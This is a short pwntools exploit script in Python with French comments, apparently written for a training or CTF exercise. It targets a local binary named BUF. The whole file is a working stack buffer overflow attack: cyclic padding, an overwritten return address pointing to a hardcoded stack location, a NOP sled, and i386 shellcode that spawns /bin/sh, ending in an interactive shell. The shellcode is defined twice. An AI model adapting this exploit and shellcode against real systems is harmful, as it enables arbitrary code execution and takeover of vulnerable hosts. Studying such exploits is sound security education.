# EXPLOIT.PY
# ----------
# Pour pwntools en Python V3

from pwn import *

proc = process('./BUF')
proc.recvline()

print("\nCr√©ation de l'exploit:")

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
padding = cyclic(cyclic_find('qaac'))
eip = p32(0xffffd09c+len(padding))
nop_ed = b'\x90' * (len(padding) + len(shellcode) + len(eip))


shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

print("Padding = ", padding)
print("Padding.len = ", len(padding))

print("eip = ", eip)
print("eip.len = ", len(eip))

print("nop_ed = ", nop_ed)
print("nop_ed.len = ", len(nop_ed))

print("shellcode = ", shellcode)
print("shellcode.len = ", len(shellcode))


payload = padding + eip + nop_ed + shellcode

print("Payload = ", payload)
print("Payload.len = ", len(payload))

proc.send(payload)
proc.interactive()